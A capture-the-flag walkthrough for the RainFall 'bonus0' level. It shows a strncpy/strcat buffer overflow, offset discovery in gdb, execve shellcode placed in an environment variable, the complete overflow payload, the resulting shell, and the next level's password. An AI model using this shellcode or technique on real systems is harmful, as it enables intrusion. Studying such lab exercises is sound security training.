@@ -1,0 +1,60 @@
+Program reads 2 strings, both of them has buffer of size 20.
+
+There are also 2 vulnarable functions strncpy() and strcat().
+
+strncpy() does not NUL terminate dst when the length of the source string is greater than or equal to the length argument.
+
+bonus0@RainFall:~$ ./bonus0 
+ - 
+01234567890123456789
+ - 
+AAAABBBBCCCCDDDDEEEE   
+01234567890123456789AAAABBBBCCCCDDDDEEEE��� AAAABBBBCCCCDDDDEEEE���
+Segmentation fault (core dumped)
+
+So if you pass 20-length strings, as result buffer has size 61 and looks like this
+
+(   arg1   +    arg2  ) +   space   +    arg2 
+20 symbols + 20 symbols +  1 symbol + 20 symbols = 61 symbols
+
+Let's find offset
+
+(gdb) run 
+Starting program: /home/user/bonus0/bonus0 
+ - 
+AAAABBBBCCCCDDDDEEEE
+ - 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+AAAABBBBCCCCDDDDEEEEAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+
+Offset's size is 9
+
+So payload will look like 
+20 + 9 + shellcode's address + 7
+
+Shellcode will be located in environ.
+
+bonus0@RainFall:~$ export fjghugfhofoh=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" ')
+
+(gdb) x/300s environ
+....
+0xbfffff1a:      "fjghugfhofoh=\220\220\220\220\220\220\220\220\220\220\220"
+....
+(gdb) x/10wx 0xbfffff1a
+0xbfffff1a:     0x68676a66      0x68666775      0x686f666f      0x9090903d
+0xbfffff2a:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffff3a:     0x90909090      0x90909090
+
+We'll use 0xbfffff2a as return pointer.
+
+bonus0@RainFall:~$ (python -c 'print "\x90" * 20'; python -c 'print "A" * 9 + "\x2a\xff\xff\xbf" + "B" * 7'; cat) | ./bonus0
+ - 
+ - 
+��������������������AAAAAAAAA*���BBBBBBB��� AAAAAAAAA*���BBBBBBB���
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
